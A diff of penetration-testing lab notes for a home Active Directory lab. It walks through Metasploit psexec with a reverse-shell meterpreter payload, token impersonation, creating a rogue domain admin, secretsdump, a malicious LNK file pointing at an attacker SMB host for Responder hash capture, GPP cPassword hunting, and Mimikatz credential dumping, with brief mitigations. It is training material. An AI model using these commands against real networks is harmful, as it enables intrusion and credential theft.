@@ -802,21 +802,29 @@ MYpassword123#
 ```
 
 # Token Impersonation
+Tokens act as temporary keys to access systems or networks without repeatedly entering credentials, similar to browser cookies.
 
-Tokens allow access to systems without reentering credentials, similar to session cookies.
-
-- **Delegation Tokens:** Used for logging into machines interactively.
+- **Delegate Tokens:** Used for interactive logins or Remote Desktop sessions.
     
-- **Impersonation Tokens:** Non-interactive access tokens.
+- **Impersonate Tokens:** Non-interactive tokens used to impersonate users.
     
 
-## Using Metasploit for Token Impersonation
 
-Start msfconsole and exploit SMB with psexec payload:
+## Practical Steps
+
+1. Power on the `THEPUNISHER` (192.168.31.93) and `HYDRA-DC` (192.168.31.90) VMs, then log into `THEPUNISHER`.
+    
+2. Launch Metasploit:
+    
 
 ```bash
 msfconsole
+```
 
+3. Use the SMB psexec exploit module:
+    
+
+```bash
 use exploit/windows/smb/psexec
 
 set payload windows/x64/meterpreter/reverse_tcp
@@ -824,56 +832,189 @@ set rhosts 192.168.31.93
 set smbdomain MARVEL.local
 set smbuser fcastle
 set smbpass Password1
-show targets
+show targets  # Proceed automatically or choose target
 
 run
+```
 
+4. Load the incognito meterpreter addon to manipulate tokens:
+    
+
+```bash
 load incognito
-
 list_tokens -u
 ```
 
-Example tokens output:
+You'll see lists of **Delegation Tokens** (e.g., `MARVEL\Administrator`, `MARVEL\fcastle`, `NT AUTHORITY\SYSTEM`) and **Impersonation Tokens** (may be none).
 
-```bash
-Delegation Tokens Available
-==============================
-Font Driver Host\UMFD-0
-Font Driver Host\UMFD-1
-Font Driver Host\UMFD-2
-MARVEL\Administrator
-MARVEL\fcastle
-NT AUTHORITY\LOCAL SERVICE
-NT AUTHORITY\NETWORK SERVICE
-NT AUTHORITY\SYSTEM
-Window Manager\DWM-1
-Window Manager\DWM-2
-
-Impersonation Tokens Available
-===============================
-No tokens available
-```
-
-Impersonate token and escalate:
-
+5. To impersonate a token:
+    
 ```bash
 impersonate_token marvel\\fcastle
+```
 
+6. Verify impersonation:
+    
+```bash
 shell
 whoami
+```
 
+7. Create a new domain admin user:
+    
+```bash
 net user /add hawkeye Password1@ /domain
 net group "Domain Admins" hawkeye /ADD /DOMAIN
+```
 
+8. Revert to your original token:
+    
+
+```bash
 rev2self
 ```
 
-## Dumping Secrets with New User
-
-Using the newly created user `hawkeye`:
-
+9. Use newly created user to dump secrets from the domain controller:
+    
 ```bash
 secretsdump.py MARVEL.local/hawkeye:'Password1@'@hydra-dc.MARVEL.local
 ```
+
+
+## Mitigations for Token Abuse
+
+- Limit permissions to create tokens for users/groups.
+    
+- Implement account tiering to separate privileged accounts.
+    
+- Restrict local administrators on endpoints.
+    
+
+
+# LNK File Attack
+
+Attackers drop malicious shortcut files (`.lnk`) in shared folders. When opened, these shortcuts can initiate SMB requests leaking credentials captured by tools like Responder.
+
+
+## Example: Creating a Malicious Shortcut on `THEPUNISHER`
+
+Run this PowerShell script on `THEPUNISHER` (192.168.31.93):
+
+```powershell
+$objShell = New-Object -ComObject WScript.shell
+$lnk = $objShell.CreateShortcut("C:\test.lnk")
+$lnk.TargetPath = "\\192.168.31.131\@test.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Test"
+$lnk.HotKey = "Ctrl+Alt+T"
+$lnk.Save()
+```
+
+Rename the file to `@test.lnk` to make it appear at the top of folder listings and copy it into the `\\hydra-dc\hackme` SMB share.
+
+
+## Using Responder on Kali to Capture Hashes
+
+```bash
+sudo responder -I eth0 -dPv
+```
+
+Open the `\\hydra-dc\hackme` share folder on `THEPUNISHER`. Responder will automatically capture any password hashes triggered by shortcut file access.
+
+
+## Automated LNK Attack via NetExec
+
+If the file share is exposed and writable, use the `slinky` module in NetExec to create malicious shortcut files remotely:
+
+```bash
+netexec smb 192.168.31.131 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.31.90
+```
+
+# Group Policy Preferences (GPP) - cPassword Attacks
+
+- GPP allowed embedded credentials in policies as encrypted cPassword fields.
+    
+- Encryption key was leaked, allowing straightforward decryption.
+    
+- This vulnerability was patched in MS14-025, but pre-existing stored credentials remain exploitable.
+    
+
+## Searching for GPP cPasswords
+
+```bash
+findstr /S /I cpassword \\marvel.local\sysvol\marvel.local\policies\*.xml
+```
+
+## Mitigations
+
+- Install security update KB2962486 on all systems managing GPOs to prevent storing new credentials in GPP.
+    
+- Remove existing XML files containing passwords from SYSVOL.
+    
+
+For a detailed guide, see: [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences – Active Directory Security](https://adsecurity.org/?p=2288)
+
+# Credential Dumping with Mimikatz
+
+[Mimikatz](https://www.kali.org/tools/mimikatz/) extracts plaintext passwords, hashes, PINs, and Kerberos tickets from memory and supports attacks like Pass-the-Hash, Pass-the-Ticket, and Golden Ticket creation.
+
+## Setup and Usage on `SPIDERMAN` (192.168.31.92)
+
+1. Login as `peterparker` and mount the `hackme` share.
+    
+2. Prepare Mimikatz folder:
+    
+
+```bash
+mkdir -p $HOME/tcm/peh/ad-attacks/mimikatz
+cd $HOME/tcm/peh/ad-attacks/mimikatz
+wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+unzip mimikatz_trunk.zip
+python3 -m http.server 80
+```
+
+3. On `SPIDERMAN` VM, download Mimikatz files from:
+    
+
+```bash
+http://192.168.31.131/mimikatz_trunk/x64/
+```
+
+3. Run Command Prompt as administrator and launch Mimikatz:
+    
+```bash
+cd "C:\Users\peterparker\Downloads"
+mimikatz.exe
+```
+
+## Key Commands
+
+```bash
+privilege::debug
+
+sekurlsa::msv          # Lists LM & NTLM credentials
+sekurlsa::wdigest      # Lists WDigest credentials
+sekurlsa::kerberos     # Lists Kerberos credentials
+sekurlsa::tspkg        # Lists TsPkg credentials
+sekurlsa::livessp      # Lists LiveSSP credentials
+sekurlsa::cloudap      # Lists CloudAp credentials
+sekurlsa::ssp          # Lists SSP credentials
+sekurlsa::logonPasswords  # Lists all available provider credentials
+sekurlsa::process      # Switch (or reinit) LSASS process context
+sekurlsa::minidump     # Switch (or reinit) LSASS minidump context
+sekurlsa::bootkey      # Attempts to decrypt LSA Isolated credentials
+sekurlsa::pth          # Pass-the-hash
+sekurlsa::krbtgt       # Kerberos Ticket Granting Ticket info
+sekurlsa::dpapisystem  # DPAPI_SYSTEM secret keys
+sekurlsa::trust        # Trust information
+sekurlsa::backupkeys   # Preferred backup master keys
+sekurlsa::tickets      # List Kerberos tickets
+sekurlsa::ekeys        # List Kerberos encryption keys
+sekurlsa::dpapi        # List cached master keys
+sekurlsa::credman      # List credential manager secrets
+```
+
+Check for plaintext passwords and NTLM hashes based on mounted shares or sessions.
 
 ---
